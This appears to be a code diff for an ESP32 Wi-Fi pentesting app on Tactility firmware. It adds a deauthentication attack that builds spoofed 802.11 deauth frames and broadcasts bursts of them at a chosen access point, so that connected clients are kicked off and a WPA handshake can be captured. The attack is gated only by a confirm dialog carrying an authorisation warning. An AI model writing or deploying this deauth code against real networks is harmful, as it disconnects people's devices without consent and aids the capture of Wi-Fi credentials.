@@ -1,5 +1,6 @@
 #include <Tactility/RecursiveMutex.h>
 #include <Tactility/Timer.h>
+#include <Tactility/app/alertdialog/AlertDialog.h>
 #include <Tactility/app/wificonnect/WifiConnect.h>
 #include <Tactility/service/neopixel/NeoPixel.h>
 #include <Tactility/service/wifi/Wifi.h>
@@ -153,6 +154,10 @@ struct Context {
     std::map<uint64_t, HandshakeCapture> handshakes;
     int handshakesSaved = 0; // .pcap files written this session
     int pmkidSeen = 0;
+    int deauthBurstsSent = 0; // confirmed deauth bursts sent this session
+    // Set from the LVGL task when the confirm dialog opens, read from this app's own task when
+    // the dialog's APP_EVENT_RESULT comes back - both directions cross threads.
+    std::atomic<uint32_t> deauthDialogId{0};
     std::vector<uint64_t> visible; // sorted by RSSI, rebuilt each refresh
     uint64_t selectedKey = 0;
     uint32_t detailBeaconBaseline = 0;
@@ -194,6 +199,7 @@ struct Context {
     lv_obj_t* detailInfo = nullptr;
     lv_obj_t* detailClientsButton = nullptr;
     lv_obj_t* detailLockButton = nullptr;
+    lv_obj_t* detailDeauthButton = nullptr;
     lv_obj_t* connectButton = nullptr;
 
     lv_obj_t* clientsPage = nullptr;
@@ -518,6 +524,47 @@ bool isCaptureSupported() { return true; }
 void setCaptureLockChannel(int ch) { g_lockChannel.store(ch); }
 int getCaptureLockChannel() { return g_lockChannel.load(); }
 
+// ---- Deauth (attack #2) ----
+
+constexpr uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+constexpr int DEAUTH_BURST_COUNT = 12;
+constexpr int DEAUTH_FRAME_GAP_MS = 25;
+
+/** Builds and sends one 802.11 deauthentication frame: addr1 = destination, addr2 = source
+ * (the spoofed sender), addr3 = BSSID. Reason 7 ("class 3 frame from a non-associated
+ * station") is what aireplay-ng uses. en_sys_seq=true lets the radio fill the sequence
+ * number, so the seq-ctl field here is left at 0. */
+void sendDeauthFrame(const uint8_t* addr1, const uint8_t* addr2, const uint8_t* bssid) {
+    uint8_t frame[26] = {
+        0xC0, 0x00,  // Frame Control: management, subtype 12 (deauthentication)
+        0x00, 0x00,  // Duration
+        0, 0, 0, 0, 0, 0,  // addr1
+        0, 0, 0, 0, 0, 0,  // addr2
+        0, 0, 0, 0, 0, 0,  // addr3 (BSSID)
+        0x00, 0x00,  // Seq-ctl
+        0x07, 0x00,  // Reason code 7
+    };
+    memcpy(frame + 4, addr1, 6);
+    memcpy(frame + 10, addr2, 6);
+    memcpy(frame + 16, bssid, 6);
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
+}
+
+/** A short, bounded deauth burst for one AP - not a continuous flood. Forces one reconnect
+ * (useful to catch a fresh handshake), it does not keep clients off the network. Broadcasts
+ * to every client when @a client is null; otherwise also spoofs the reverse (client -> AP)
+ * direction, since a real client ignores a deauth that isn't addressed to it. */
+void sendDeauthBurst(const uint8_t* bssid, const uint8_t* client) {
+    const uint8_t* target = (client != nullptr) ? client : BROADCAST_MAC;
+    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
+        sendDeauthFrame(target, bssid, bssid);
+        if (client != nullptr) {
+            sendDeauthFrame(bssid, client, bssid);
+        }
+        vTaskDelay(pdMS_TO_TICKS(DEAUTH_FRAME_GAP_MS));
+    }
+}
+
 // ---- .pcap writing (handshake export to SD) ----
 
 void pcapU32(FILE* f, uint32_t v) { fwrite(&v, 4, 1, f); } // ESP32 is little-endian = pcap LE
@@ -570,6 +617,7 @@ void stopCapture(Context*) {}
 bool isCaptureSupported() { return false; }
 void setCaptureLockChannel(int) {}
 int getCaptureLockChannel() { return 0; }
+void sendDeauthBurst(const uint8_t*, const uint8_t*) {}
 
 #endif // ESP_PLATFORM
 
@@ -1033,6 +1081,30 @@ void onToggleLock(lv_event_t* event) {
     updateLeds(ctx);
 }
 
+// Deauth is destructive (it disconnects a real client), so it always goes through a confirm
+// dialog rather than firing on tap - the actual send happens in appMain() once the dialog's
+// APP_EVENT_RESULT comes back confirmed.
+void onDeauthPressed(lv_event_t* event) {
+    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
+    char ssid[33] = {};
+    bool found = false;
+    if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+        auto it = ctx->seen.find(ctx->selectedKey);
+        if (it != ctx->seen.end()) {
+            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
+            found = true;
+        }
+        ctx->mutex.unlock();
+    }
+    if (!found) return;
+
+    char message[160];
+    snprintf(message, sizeof(message),
+        "Invia deauth a TUTTI i client di \"%s\"?\nSolo su reti/dispositivi tuoi o autorizzati.",
+        ssid[0] != '\0' ? ssid : "(nascosta)");
+    ctx->deauthDialogId = tt::app::alertdialog::start(ctx->appInstanceId, "Deauth", message, { "Invia", "Annulla" });
+}
+
 void onShowClients(lv_event_t* event);
 
 // ---- List page ----
@@ -1180,6 +1252,7 @@ void updateDetail(Context* ctx) {
     uint32_t beaconBaseline = 0;
     int clientCount = 0;
     bool hsPresent = false, hsHas[4] = {}, hsPmkid = false, hsSaved = false;
+    int deauthBursts = 0;
     if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
         auto it = ctx->seen.find(ctx->selectedKey);
         if (it != ctx->seen.end()) {
@@ -1197,6 +1270,7 @@ void updateDetail(Context* ctx) {
                 hsSaved = hit->second.saved;
             }
         }
+        deauthBursts = ctx->deauthBurstsSent;
         ctx->mutex.unlock();
     }
     if (!found) return;
@@ -1247,6 +1321,11 @@ void updateDetail(Context* ctx) {
     } else {
         offset += snprintf(text + offset, sizeof(text) - offset,
             "Handshake: nessuno (in cattura, serve che un client si (ri)connetta)\n");
+    }
+
+    if (deauthBursts > 0) {
+        offset += snprintf(text + offset, sizeof(text) - offset,
+            "Deauth inviati: %d\n", deauthBursts);
     }
     lv_label_set_text(ctx->detailInfo, text);
 
@@ -1799,6 +1878,12 @@ void createDetailPage(Context* ctx, lv_obj_t* parent) {
     if (isCaptureSupported()) {
         ctx->detailLockButton = lv_list_add_button(scroll, LV_SYMBOL_GPS, "Cattura mirata");
         lv_obj_add_event_cb(ctx->detailLockButton, onToggleLock, LV_EVENT_CLICKED, ctx);
+
+        // Red: this one actively disconnects real clients, unlike the other (passive) buttons.
+        ctx->detailDeauthButton = lv_list_add_button(scroll, LV_SYMBOL_WARNING, "Deauth");
+        lv_obj_set_style_bg_color(ctx->detailDeauthButton, lv_color_hex(0xB33A3A), 0);
+        lv_obj_set_style_bg_opa(ctx->detailDeauthButton, LV_OPA_50, 0);
+        lv_obj_add_event_cb(ctx->detailDeauthButton, onDeauthPressed, LV_EVENT_CLICKED, ctx);
     }
 
     ctx->detailInfo = lv_label_create(scroll);
@@ -1879,6 +1964,7 @@ void destroyWidgets(void* userData) {
     ctx->detailInfo = nullptr;
     ctx->detailClientsButton = nullptr;
     ctx->detailLockButton = nullptr;
+    ctx->detailDeauthButton = nullptr;
     ctx->connectButton = nullptr;
     ctx->clientsPage = nullptr;
     ctx->clientsList = nullptr;
@@ -1924,6 +2010,44 @@ int32_t appMain(int /*argc*/, char* /*argv*/[]) {
             if (event.type == APP_EVENT_CLOSE) {
                 shouldClose = true;
                 break;
+            } else if (event.type == APP_EVENT_RESULT) {
+                if (event.result.launch_id == ctx.deauthDialogId.load() && event.result.result == 0) {
+                    uint8_t bssid[6];
+                    int channel = 0;
+                    bool found = false;
+                    RadioMode currentMode = RadioMode::Stopped;
+                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
+                        auto it = ctx.seen.find(ctx.selectedKey);
+                        if (it != ctx.seen.end()) {
+                            memcpy(bssid, it->second.record.bssid, 6);
+                            channel = it->second.record.channel;
+                            found = true;
+                        }
+                        currentMode = ctx.mode;
+                        ctx.mutex.unlock();
+                    }
+                    // Same reason the targeted-capture lock exists: off the target's channel,
+                    // the deauth frames just go out into whatever channel we're hopping through.
+                    if (found && channel >= 1 && channel <= 13) {
+                        if (currentMode != RadioMode::Capture) {
+                            // setMode() touches LVGL widgets (button states); this handler runs
+                            // on the app's own task, not the LVGL task, so it must hold the lock
+                            // itself (updateDetail()'s callers from onTimer do the same).
+                            lvgl_lock();
+                            setMode(&ctx, RadioMode::Capture);
+                            lvgl_unlock();
+                        }
+                        setCaptureLockChannel(channel);
+                        // Sending blocks this task for the burst's duration (a few hundred ms) -
+                        // fine, it's this app's own dedicated task, not the LVGL or timer task.
+                        sendDeauthBurst(bssid, nullptr);
+                        if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
+                            ctx.deauthBurstsSent++;
+                            ctx.mutex.unlock();
+                        }
+                    }
+                }
+                app_manager_stop(event.result.launch_id);
             }
         }
     }
